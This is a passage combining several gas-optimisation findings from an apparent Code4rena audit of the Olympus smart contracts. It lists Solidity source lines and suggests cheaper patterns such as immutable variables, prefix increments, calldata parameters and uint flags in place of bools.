2022-08-olympus/src/policies/interfaces/IOperator.sol::18 => uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds 2022-08-olympus/src/policies/interfaces/IOperator.sol::19 => uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall 2022-08-olympus/src/policies/interfaces/IOperator.sol::20 => uint32 regenObserve; // number of price points to observe to determine regeneration 2022-08-olympus/src/policies/interfaces/IOperator.sol::31 => uint32 count; // current number of price points that count towards regeneration 2022-08-olympus/src/policies/interfaces/IOperator.sol::33 => uint32 nextObservation; // index of the next observation in the observations array ```  ## [G-08] Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled. Use uint256(1) and uint256(2) for true/false instead  ``` 2022-08-olympus/src/Kernel.sol::113 => bool public isActive; 2022-08-olympus/src/Kernel.sol::181 => mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; 2022-08-olympus/src/Kernel.sol::194 => mapping(address => mapping(Role => bool)) public hasRole; 2022-08-olympus/src/Kernel.sol::197 => mapping(Role => bool) public isRole; 2022-08-olympus/src/modules/PRICE.sol::62 => bool public initialized; 2022-08-olympus/src/policies/BondCallback.sol::24 => mapping(address => mapping(uint256 => bool)) public approvedMarkets; 2022-08-olympus/src/policies/Governance.sol::105 => mapping(uint256 => bool) public proposalHasBeenActivated; 2022-08-olympus/src/policies/Governance.sol::117 => mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; 2022-08-olympus/src/policies/Heart.sol::33 => bool public active; 2022-08-olympus/src/policies/Operator.sol::63 => bool public initialized; 2022-08-olympus/src/policies/Operator.sol::66 => bool public active; ```  ## [G-09] <x> += <y> costs more gas than <x> = <x> + <y> for state variables  use <x> = <x> + <y> or <x> = <x> - <y> instead to save gas  ``` 2022-08-olympus/src/modules/PRICE.sol::136 => _movingAverage += (currentPrice - earliestPrice) / numObs; 2022-08-olympus/src/modules/PRICE.sol::138 => _movingAverage -= (earliestPrice - currentPrice) / numObs; 2022-08-olympus/src/modules/PRICE.sol::222 => total += startObservations_[i]; 2022-08-olympus/src/modules/TRSRY.sol::96 => reserveDebt[token_][msg.sender] += amount_; 2022-08-olympus/src/modules/TRSRY.sol::97 => totalDebt[token_] += amount_; 2022-08-olympus/src/modules/TRSRY.sol::115 => reserveDebt[token_][msg.sender] -= received; 2022-08-olympus/src/modules/TRSRY.sol::116 => totalDebt[token_] -= received; 2022-08-olympus/src/modules/TRSRY.sol::131 => if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; 2022-08-olympus/src/modules/TRSRY.sol::132 => else totalDebt[token_] -= oldDebt - amount_; 2022-08-olympus/src/modules/VOTES.sol::56 => balanceOf[from_] -= amount_; 2022-08-olympus/src/modules/VOTES.sol::58 => balanceOf[to_] += amount_; 2022-08-olympus/src/policies/BondCallback.sol::143 => _amountsPerMarket[id_][0] += inputAmount_; 2022-08-olympus/src/policies/BondCallback.sol::144 => _amountsPerMarket[id_][1] += outputAmount_; 2022-08-olympus/src/policies/Governance.sol::194 => totalEndorsementsForProposal[proposalId_] -= previousEndorsement; 2022-08-olympus/src/policies/Governance.sol::198 => totalEndorsementsForProposal[proposalId_] += userVotes; 2022-08-olympus/src/policies/Governance.sol::252 => yesVotesForProposal[activeProposal.proposalId] += userVotes; 2022-08-olympus/src/policies/Governance.sol::254 => noVotesForProposal[activeProposal.proposalId] += userVotes; 2022-08-olympus/src/policies/Heart.sol::103 => lastBeat += frequency(); ```  ## [G-11] Use a more recent version of solidity  Use a solidity version of at least 0.8.2 to get compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  ``` 2022-08-olympus/src/policies/interfaces/IHeart.sol::2 => pragma solidity >=0.8.0; 2022-08-olympus/src/policies/interfaces/IOperator.sol::2 => pragma solidity >=0.8.0; ```  ## [G-12] Prefix increments cheaper than Postfix increments  ++i costs less gas than i++, especially when it's used in for-loops (--i/i-- too) Saves 5 gas PER LOOP  ``` 2022-08-olympus/src/utils/KernelUtils.sol::49 => i++; 2022-08-olympus/src/utils/KernelUtils.sol::64 => i++; ```  ## [G-13] Don't compare boolean expressions to boolean literals  The extran comparison wastes gas if (<x> == true) => if (<x>), if (<x> == false) => if (!<x>)  ``` 2022-08-olympus/src/policies/Governance.sol::223 => if (proposalHasBeenActivated[proposalId_] == true) { 2022-08-olympus/src/policies/Governance.sol::306 => if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ## [G-14] Public functions not called by the contract should be declared external instead  Contracts are allowed to override their parents' functions and change the visibility from external to public and can save gas by doing so.  ``` 2022-08-olympus/src/Kernel.sol::439 => function grantRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/Kernel.sol::451 => function revokeRole(Role role_, address addr_) public onlyAdmin { 2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/INSTR.sol::37 => function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) { 2022-08-olympus/src/modules/MINTR.sol::20 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/MINTR.sol::33 => function mintOhm(address to_, uint256 amount_) public permissioned { 2022-08-olympus/src/modules/MINTR.sol::37 => function burnOhm(address from_, uint256 amount_) public permissioned { 2022-08-olympus/src/modules/PRICE.sol::108 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/RANGE.sol::110 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/TRSRY.sol::47 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/VOTES.sol::22 => function KEYCODE() public pure override returns (Keycode) { 2022-08-olympus/src/modules/VOTES.sol::45 => function transfer(address to_, uint256 amount_) public pure override returns (bool) { 2022-08-olympus/src/policies/Governance.sol::145 => function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) { 2022-08-olympus/src/policies/Governance.sol::151 => function getActiveProposal() public view returns (ActivatedProposal memory) { ```  ## [G-15] Not using the named return variables when a function returns, wastes deployment gas  It is not necessary to have both a named return and a return statement.  ``` 2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/MINTR.sol::25 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/PRICE.sol::113 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/RANGE.sol::115 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/TRSRY.sol::51 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/modules/VOTES.sol::27 => function VERSION() external pure override returns (uint8 major, uint8 minor) { 2022-08-olympus/src/policies/BondCallback.sol::177 => returns (uint256 in_, uint256 out_) ```  ## [G-16] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate  Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  ``` 2022-08-olympus/src/modules/TRSRY.sol::33 => mapping(address => mapping(ERC20 => uint256)) public withdrawApproval; 2022-08-olympus/src/modules/TRSRY.sol::39 => mapping(ERC20 => mapping(address => uint256)) public reserveDebt; ```  ``` 2022-08-olympus/src/policies/Governance.sol::102 => mapping(uint256 => mapping(address => uint256)) public userEndorsementsForProposal; 2022-08-olympus/src/policies/Governance.sol::114 => mapping(uint256 => mapping(address => uint256)) public userVotesForProposal; 2022-08-olympus/src/policies/Governance.sol::117 => mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ## [G-17] Use assembly to check for address(0)  Saves 6 gas per instance if using assembly to check for address(0)  e.g. ``` assembly {  if iszero(_addr) {   mstore(0x00, "zero address")   revert(0x00, 0x20)  } } ```  instances:  ``` 2022-08-olympus/src/Kernel.sol::269 => if (address(getModuleForKeycode[keycode]) != address(0)) ```  ## [G-18] Using storage instead of memory for structs/arrays saves gas  When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read.  Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct  ``` 2022-08-olympus/src/Kernel.sol::379 => Policy[] memory dependents = moduleDependents[keycode_]; ```  ## [G-19] internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  ``` 2022-08-olympus/src/Kernel.sol::131 => function getModuleAddress(Keycode keycode_) internal view returns (address) { 2022-08-olympus/src/Kernel.sol::266 => function _installModule(Module newModule_) internal { 2022-08-olympus/src/Kernel.sol::279 => function _upgradeModule(Module newModule_) internal { 2022-08-olympus/src/Kernel.sol::295 => function _activatePolicy(Policy policy_) internal { 2022-08-olympus/src/Kernel.sol::325 => function _deactivatePolicy(Policy policy_) internal { 2022-08-olympus/src/Kernel.sol::351 => function _migrateKernel(Kernel newKernel_) internal { 2022-08-olympus/src/Kernel.sol::378 => function _reconfigurePolicies(Keycode keycode_) internal { 2022-08-olympus/src/Kernel.sol::409 => function _pruneFromDependents(Policy policy_) internal { 2022-08-olympus/src/policies/Heart.sol::111 => function _issueReward(address to_) internal { 2022-08-olympus/src/policies/Operator.sol::652 => function _addObservation() internal { ```  ## [G-20] State variables only set in the constructor should be declared immutable  Avoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a PUSH32 (3 gas).  ``` 2022-08-olympus/src/policies/BondCallback.sol::43 => aggregator = aggregator_; 2022-08-olympus/src/policies/BondCallback.sol::44 => ohm = ohm_; 2022-08-olympus/src/policies/Heart.sol::60 => _operator = operator_; 2022-08-olympus/src/policies/Operator.sol::144 => _status = Status({low: regen, high: regen}); ```  ## [G-21] internal functions not called by the contract should be removed to save deployment gas  If the functions are required by an interface, the contract should inherit from that interface and use the override keyword  ``` 2022-08-olympus/src/Kernel.sol::131 => function getModuleAddress(Keycode keycode_) internal view returns (address) { ``` 
### [G-01] Using bools for storage incurs overhead.   #### Impact   ```     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use ```uint256(1)``` and ```uint256(2)``` for true/false to avoid a Gwarmaccess ([100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past   #### Findings: ``` src/modules/PRICE.sol:L62    bool public initialized; src/policies/Heart.sol:L33    bool public active;  src/policies/Operator.sol:L63    bool public initialized;  src/policies/Operator.sol:L66    bool public active;  src/policies/BondCallback.sol:L24    mapping(address => mapping(uint256 => bool)) public approvedMarkets;  src/policies/Governance.sol:L105    mapping(uint256 => bool) public proposalHasBeenActivated;  src/policies/Governance.sol:L117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ###  [G-02] Cache Array Length Outside of Loop   #### Impact Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.   #### Findings: ``` src/policies/Governance.sol:L278        for (uint256 step; step < instructions.length; ) { ```  ### [G-03] Empty blocks should be removed or emit something   #### Impact The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.   #### Findings: ``` src/modules/VOTES.sol:L19    {}  src/modules/TRSRY.sol:L45    constructor(Kernel kernel_) Module(kernel_) {}  src/modules/INSTR.sol:L20    constructor(Kernel kernel_) Module(kernel_) {}  src/policies/PriceConfig.sol:L15    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/VoterRegistration.sol:L16    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/TreasuryCustodian.sol:L24    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/Governance.sol:L59    constructor(Kernel kernel_) Policy(kernel_) {}  ``` ### [G-04] Use a more recent version of solidity.   #### Impact Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining  Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads  Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings  Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.   #### Findings: ``` src/interfaces/IBondCallback.sol:L2      pragma solidity >=0.8.0;  src/policies/interfaces/IOperator.sol:L2      pragma solidity >=0.8.0;  src/policies/interfaces/IHeart.sol:L2      pragma solidity >=0.8.0; ```  ### [G-05] Functions guaranteed to revert when called by normal users can be declared as payable.   #### Impact If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.   #### Findings: ``` src/policies/Heart.sol:L130    function resetBeat() external onlyRole("heart_admin") {  src/policies/Heart.sol:L135    function toggleBeat() external onlyRole("heart_admin") {  src/policies/Heart.sol:L150    function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") {  src/policies/VoterRegistration.sol:L45    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") {  src/policies/VoterRegistration.sol:L53    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") {  src/policies/Operator.sol:L195    function operate() external override onlyWhileActive onlyRole("operator_operate") {  src/policies/Operator.sol:L510    function setThresholdFactor(uint256 thresholdFactor_) external onlyRole("operator_policy") {  src/policies/Operator.sol:L516    function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {  src/policies/Operator.sol:L548    function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {  src/policies/Operator.sol:L598    function initialize() external onlyRole("operator_admin") {  src/policies/Operator.sol:L618    function regenerate(bool high_) external onlyRole("operator_admin") {  src/policies/Operator.sol:L624    function toggleActive() external onlyRole("operator_admin") {  src/policies/BondCallback.sol:L152    function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {  src/policies/BondCallback.sol:L190    function setOperator(Operator operator_) external onlyRole("callback_admin") {  ```  ### [G-06] ```X += Y``` costs more gas than ```X = X + Y``` for state variables.   #### Impact Consider changing ```X += Y``` to ```X = X + Y``` to save gas.   #### Findings: ``` src/modules/VOTES.sol:L58            balanceOf[to_] += amount_;  src/modules/PRICE.sol:L136            _movingAverage += (currentPrice - earliestPrice) / numObs;  src/modules/PRICE.sol:L222            total += startObservations_[i];  src/modules/TRSRY.sol:L96        reserveDebt[token_][msg.sender] += amount_;  src/modules/TRSRY.sol:L97        totalDebt[token_] += amount_;  src/modules/TRSRY.sol:L131        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  src/policies/Heart.sol:L103        lastBeat += frequency();  src/policies/BondCallback.sol:L143        _amountsPerMarket[id_][0] += inputAmount_;  src/policies/BondCallback.sol:L144        _amountsPerMarket[id_][1] += outputAmount_;  src/policies/Governance.sol:L198        totalEndorsementsForProposal[proposalId_] += userVotes;  src/policies/Governance.sol:L252            yesVotesForProposal[activeProposal.proposalId] += userVotes;  src/policies/Governance.sol:L254            noVotesForProposal[activeProposal.proposalId] += userVotes;  ``` ### [G-07] ++i costs less gas than i++, especially when it's used in for loops.   #### Impact Saves 6 gas per instance.   #### Findings: ``` src/policies/Operator.sol:L488            decimals++;  src/policies/Operator.sol:L670                _status.low.count++;  src/policies/Operator.sol:L686                _status.high.count++;  src/utils/KernelUtils.sol:L49            i++;  src/utils/KernelUtils.sol:L64            i++; ```  ### [G-08] Using private rather than public for constants to saves gas.   #### Impact If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.   #### Findings: ``` src/modules/PRICE.sol:L59    uint8 public constant decimals = 18;  src/modules/RANGE.sol:L65    uint256 public constant FACTOR_SCALE = 1e4;  src/policies/Operator.sol:L89    uint32 public constant FACTOR_SCALE = 1e4;  src/policies/Governance.sol:L121    uint256 public constant SUBMISSION_REQUIREMENT = 100;  src/policies/Governance.sol:L124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  src/policies/Governance.sol:L127    uint256 public constant GRACE_PERIOD = 1 weeks;  src/policies/Governance.sol:L130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  src/policies/Governance.sol:L133    uint256 public constant EXECUTION_THRESHOLD = 33;  src/policies/Governance.sol:L137    uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  ### [G-09] Explicit initialization with zero not required   #### Impact Explicit initialization with zero is not required for variable declaration because uints are 0 by default. Removing this will reduce contract size and save a bit of gas.   #### Findings: ``` src/utils/KernelUtils.sol:L43    for (uint256 i = 0; i < 5; ) {  src/utils/KernelUtils.sol:L58    for (uint256 i = 0; i < 32; ) { ```  
### description  calldata should be used instead of memory for function parameters saves gas if the function argument is only read.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L393  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205  https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondTeller.sol#L43
